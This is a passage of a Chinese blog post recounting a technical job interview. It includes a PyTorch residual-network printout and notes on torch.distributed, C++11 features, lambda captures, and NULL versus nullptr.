class="number">3</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">4</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">5</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">6</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">7</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">    (policy_head): PolicyHead(</span><br><span class="line">      (conv1): Conv2d(<span class="number">96</span>, <span class="number">48</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">      (bn1): BatchNorm2d(<span class="number">48</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      (relu): ReLU()</span><br><span class="line">      (conv2): Conv2d(<span class="number">48</span>, <span class="number">1</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">      (bn2): BatchNorm2d(<span class="number">1</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">    )</span><br><span class="line">    (value_head): ValueHead(</span><br><span class="line">      (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">      (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">      (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      (relu): ReLU()</span><br><span class="line">      (fc): Linear(in_features=<span class="number">96</span>, out_features=<span class="number">1</span>, bias=<span class="literal">True</span>)</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">  (second_net): RestNet8B96C(</span><br><span class="line">    (conv): Conv2d(<span class="number">1</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">    (bn): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">    (relu): ReLU()</span><br><span class="line">    (residues): Sequential(</span><br><span class="line">      (<span class="number">0</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">1</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">2</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">3</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">4</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">5</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">6</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">      (<span class="number">7</span>): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">    (policy_head): PolicyHead(</span><br><span class="line">      (conv1): Conv2d(<span class="number">96</span>, <span class="number">48</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">      (bn1): BatchNorm2d(<span class="number">48</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      (relu): ReLU()</span><br><span class="line">      (conv2): Conv2d(<span class="number">48</span>, <span class="number">1</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">      (bn2): BatchNorm2d(<span class="number">1</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">    )</span><br><span class="line">    (value_head): ValueHead(</span><br><span class="line">      (conv1): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">      (bn1): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      (conv2): Conv2d(<span class="number">96</span>, <span class="number">96</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), stride=(<span class="number">1</span>, <span class="number">1</span>), padding=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">      (bn2): BatchNorm2d(<span class="number">96</span>, eps=<span class="number">1e-05</span>, momentum=<span class="number">0.1</span>, affine=<span class="literal">True</span>, track_running_stats=<span class="literal">True</span>)</span><br><span class="line">      (relu): ReLU()</span><br><span class="line">      (fc): Linear(in_features=<span class="number">96</span>, out_features=<span class="number">1</span>, bias=<span class="literal">True</span>)</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><hr><blockquote><p>问：你了解过什么深度学习框架吗？</p></blockquote><p>答：主要使用过pytorch框架</p><blockquote><p>问：那你知道pytorch中有一个关于分布式计算的接口叫什么吗？</p></blockquote><p>答：这个不太清楚，因为实验室资源有限，确实没有使用过这个功能（此时面试官哈哈哈哈笑了，感觉很放松耶）</p><h3 id="3-1-2-torch-distributed"><a href="#3-1-2-torch-distributed" class="headerlink" title="3.1.2 torch.distributed"></a>3.1.2 torch.distributed</h3><p>torch.distributed 包为在一台或多台机器上运行的多个计算节点上的多进程并行结构提供PyTorch支持和通信原语。 torch.nn.parallel.DistributedDataParallel()类就是基于此功能构建的，作为任何PyTorch模型的包装来提供同步分布式训练。这不同于 Multiprocessing package - torch.multiprocessing 和 torch.nn.DataParallel() 提供的并行结构，因为它支持多台联网的机器而且用户必须显式地为每个进程启动主要训练脚本的副本。</p><h2 id="3-2-C-代码知识"><a href="#3-2-C-代码知识" class="headerlink" title="3.2 C++ 代码知识"></a>3.2 C++ 代码知识</h2><blockquote><p>问：你主要使用什么语言多一点？</p></blockquote><p>答：C++ 吧</p><blockquote><p>问：你上面不是有个项目，涉及神经网络吗，那不应该是 python 吗？</p></blockquote><p>答：是的，但是我写算法题什么的都是使用 C++，而且那个也是去年做的项目了，所以现在对 C++ 比较熟悉一些</p><blockquote><p>问：那我问你一些关于 C++ 语法的问题吧，你知道 C++11 引进了什么特性吗？</p></blockquote><p>答：（当时其实心里一点底都没有，但当时只能硬说了）我记得有一个 auto 关键字，好像还有一个 lamda 表达式</p><hr><h3 id="3-2-1-C-11新特性"><a href="#3-2-1-C-11新特性" class="headerlink" title="3.2.1 C++11新特性"></a>3.2.1 C++11新特性</h3><ol><li>nullptr：替代 NULL，专门用来区分空指针、0。nullptr 的类型为 nullptr_t，能够隐式的转换为任何指针或成员指针的类型，也能和他们进行相等或者不等的比较。</li><li>类型推导：C++11 引入了 auto 和 decltype 这两个关键字实现了类型推导，让编译器来操心变量的类型。<ul><li>&#x20;auto 进行类型推导</li><li>decltype 关键字是为了解决 auto 关键字只能对变量进行类型推导的缺陷而出现的，它可以使编译器自动分析表达式的类型并得到它的类型，最关键是它不会去计算表达式的值。它的用法和 sizeof 很相似：<code>decltype(表达式)</code></li></ul></li><li>区间迭代 - 基于范围的 for 循环</li><li>Lambda表达式： Lambda 表达式实际上就是提供了一个类似<strong>匿名函数</strong>的特性，而匿名函数则是<strong>在需要一个函数，但是又不想费力去命名一个函数的情况下</strong>去使用的。</li><li>正则表达式：提供了正则表达式库，用于操作 std::string 对象</li></ol><hr><blockquote><p>问：既然说到lamda表达式，那你能说说lamda表达式什么吗？</p></blockquote><p>答：（这个真的一点都不知道）我主要是在python中使用过，C++中很少使用，….</p><blockquote><p>问：那你说用了lamda表达式有什么感受吗？</p></blockquote><p>答：感觉代码更短更简洁了（面试官笑了，我也笑了哈哈哈哈）</p><h3 id="3-2-2-Lamda表达式"><a href="#3-2-2-Lamda表达式" class="headerlink" title="3.2.2 Lamda表达式"></a>3.2.2 Lamda表达式</h3><p>Lambda 表达式是一种在被调用的位置或作为参数传递给函数的位置定义匿名函数对象（闭包）的简便方法。Lambda表达式的基本语法如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[capture list] (parameter list) -&gt; <span class="keyword">return</span> type &#123; function body &#125;</span><br></pre></td></tr></table></figure><ul><li><strong>capture list 是捕获列表</strong>，用于指定 Lambda表达式可以访问的外部变量，以及是按值还是按引用的方式访问。捕获列表可以为空，表示不访问任何外部变量，也可以使用默认捕获模式 &amp; 或 &#x3D; 来表示按引用或按值捕获所有外部变量，还可以混合使用具体的变量名和默认捕获模式来指定不同的捕获方式。</li><li><strong>parameter list 是参数列表</strong>，用于表示 Lambda表达式的参数，可以为空，表示没有参数，也可以和普通函数一样指定参数的类型和名称，还可以在 c++14 中使用 auto 关键字来实现泛型参数。</li><li><strong>return type 是返回值类型</strong>，用于指定 Lambda表达式的返回值类型，可以省略，表示由编译器根据函数体推导，也可以使用 -&gt; 符号显式指定，还可以在 c++14 中使用 auto 关键字来实现泛型返回值。</li><li><strong>function body 是函数体</strong>，用于表示 Lambda表达式的具体逻辑，可以是一条语句，也可以是多条语句，还可以在 c++14 中使用 constexpr 来实现编译期计算。</li></ul><h4 id="3-2-2-1-Lambda表达式的捕获方式"><a href="#3-2-2-1-Lambda表达式的捕获方式" class="headerlink" title="3.2.2.1 Lambda表达式的捕获方式"></a>3.2.2.1 Lambda表达式的捕获方式</h4><ul><li>值捕获（capture by value）：在捕获列表中使用变量名，表示将该变量的值拷贝到 Lambda 表达式中，作为一个数据成员。值捕获的变量在 Lambda 表达式定义时就已经确定，不会随着外部变量的变化而变化。值捕获的变量默认不能在 Lambda 表达式中修改，除非使用 mutable 关键字。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">auto</span> f = [x] (<span class="type">int</span> y) -&gt; <span class="type">int</span> &#123; <span class="keyword">return</span> x + y; &#125;; <span class="comment">// 值捕获 x</span></span><br><span class="line">x = <span class="number">20</span>; <span class="comment">// 修改外部的 x</span></span><br><span class="line">cout &lt;&lt; <span class="built_in">f</span>(<span class="number">5</span>) &lt;&lt; endl; <span class="comment">// 输出 15，不受外部 x 的影响</span></span><br></pre></td></tr></table></figure><ul><li>引用捕获（capture by reference）：在捕获列表中使用 &amp; 加变量名，表示将该变量的引用传递到 Lambda 表达式中，作为一个数据成员。引用捕获的变量在 Lambda 表达式调用时才确定，会随着外部变量的变化而变化。引用捕获的变量可以在 Lambda 表达式中修改，但要注意生命周期的问题，避免悬空引用的出现。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">auto</span> f = [&amp;x] (<span class="type">int</span> y) -&gt; <span class="type">int</span> &#123; <span class="keyword">return</span> x + y; &#125;; <span class="comment">// 引用捕获 x</span></span><br><span class="line">x = <span class="number">20</span>; <span class="comment">// 修改外部的 x</span></span><br><span class="line">cout &lt;&lt; <span class="built_in">f</span>(<span class="number">5</span>) &lt;&lt; endl; <span class="comment">// 输出 25，受外部 x 的影响</span></span><br></pre></td></tr></table></figure><ul><li>隐式捕获（implicit capture）：在捕获列表中使用 <code>=</code> 或 <code>&amp;</code>，表示按值或按引用捕获 Lambda 表达式中使用的所有外部变量。这种方式可以简化捕获列表的书写，避免过长或遗漏。隐式捕获可以和显式捕获混合使用，但不能和同类型的显式捕获一起使用。例如：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">auto</span> f = [=, &amp;y] (<span class="type">int</span> z) -&gt; <span class="type">int</span> &#123; <span class="keyword">return</span> x + y + z; &#125;; <span class="comment">// 隐式按值捕获 x，显式按引用捕获 y</span></span><br><span class="line">x = <span class="number">30</span>; <span class="comment">// 修改外部的 x</span></span><br><span class="line">y = <span class="number">40</span>; <span class="comment">// 修改外部的 y</span></span><br><span class="line">cout &lt;&lt; <span class="built_in">f</span>(<span class="number">5</span>) &lt;&lt; endl; <span class="comment">// 输出 55，不受外部 x 的影响，受外部 y 的影响</span></span><br></pre></td></tr></table></figure><h4 id="3-2-2-2-Lambda表达式的优点"><a href="#3-2-2-2-Lambda表达式的优点" class="headerlink" title="3.2.2.2 Lambda表达式的优点"></a>3.2.2.2 Lambda表达式的优点</h4><ol><li><p>简洁：Lambda表达式可以省略函数名和类名，直接定义和使用，使得代码更加简洁和清晰。</p></li><li><p>灵活：Lambda表达式可以捕获外部变量，可以作为函数参数，也可以作为函数返回值，使得代码更加灵活和方便。</p></li><li><p>安全：Lambda表达式可以控制外部变量的访问方式，可以避免全局变量的定义，可以避免悬空指针和无效引用的产生，使得代码更加安全和稳定。</p></li></ol><hr><blockquote><p>问：NULL和nullptr有什么区别？</p></blockquote><p>答：nullptr应该是指空指针，NULL应该是指无效的数据类型（当时这个一点不知道哈哈哈哈）</p><blockquote><p>问：你一般用哪个？</p></blockquote><p>答：我只使用后面那个，前面那个只听说了，自己没有使用过</p><h3 id="3-2-3-C-中NULL和nullptr的区别"><a href="#3-2-3-C-中NULL和nullptr的区别" class="headerlink" title="3.2.3 C++中NULL和nullptr的区别"></a>3.2.3 C++中NULL和nullptr的区别</h3><p>在编写C程序的时候只看到过NULL，而在C++的编程中，可以看到NULL和nullptr两种关键字，其实nullptr是C++11版本中新加入的，它的出现是为了解决NULL表示空指针在C++中具有二义性的问题。</p><p>在C语言中，NULL通常被定义为：<code>#define NULL ((void )0)</code>，所以说NULL实际上是一个空指针，如果在C语言中写入以下代码，编译是没有问题的，因为在C语言中把空指针赋给int和char指针的时候，发生了隐式类型转换，把void指针转换成了相应类型的指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>  *pi = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span> *pc = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>但是问题来了，以上代码如果使用C++编译器来编译则是会出错的，因为C++是强类型语言，void*是不能隐式转换成其他类型的指针的，所以实际上编译器提供的头文件做了相应的处理：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULL 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULL ((void *)0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>可见，在C++中，NULL实际上是0.因为C++中不能把void*类型的指针隐式转换成其他类型的指针，所以为了结果空指针的表示问题，C++引入了0来表示空指针，这样就有了上述代码中的NULL宏定义。</p><p>但是实际上，用NULL代替0表示空指针在函数重载时会出现问题，程序执行的结果会与我们的想法不同，举例如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 